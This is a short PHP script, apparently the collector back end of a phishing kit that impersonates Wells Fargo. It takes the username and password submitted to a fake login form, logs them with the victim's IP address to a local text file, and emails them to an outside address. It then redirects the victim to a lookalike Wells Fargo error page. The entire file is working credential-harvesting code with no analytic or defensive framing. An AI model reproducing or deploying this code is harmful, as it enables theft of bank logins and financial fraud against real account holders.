<?
session_start();  
$ip = getenv("REMOTE_ADDR");    
$j_username = $_POST['j_username'];  
$j_password = $_POST['j_password'];   
 
$subj = " ||Wells Fargo ReZulT||$ip ";
$msg = " ------------------------------------------  \nUsername: $j_username\nPassword: $j_password\nIP: $ip\n  "; 


$file = fopen("w.txt","a");
fwrite($file,$msg);
fclose($file);
 
mail("dd@jddtld.com", $subj, $msg); 
header("Location: https://main.d1ewn5ndyq01a0.amplifyapp.com/inner_pag.html?connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes&LOB=CONS&destination=AccountSummary");


?>